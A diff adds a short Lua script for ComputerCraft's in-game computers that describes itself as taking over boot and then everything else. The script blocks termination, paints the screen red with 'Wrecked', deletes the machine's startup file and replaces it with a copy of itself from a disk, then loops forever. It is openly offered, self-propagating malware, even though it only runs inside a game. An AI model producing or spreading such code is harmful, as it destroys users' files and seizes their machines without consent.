@@ -1,0 +1,21 @@
+--Takes over boot/config and then once in control does takes over everything else.
+
+os.pullEvent = os.pullEventRaw
+
+w, h = term.getSize()
+
+term.setBackgroundColor(colors.red)
+term.clear()
+term.setCursorPos(w / 2 - 7, h / 2)
+print("Wrecked")
+
+if fs.exists("startup") then
+  fs.delete("startup")
+  fs.copy("disk/bootstealer", "startup")
+else
+  fs.copy("disk/bootstealer", "startup")
+end
+
+while true do 
+  sleep(10)
+end
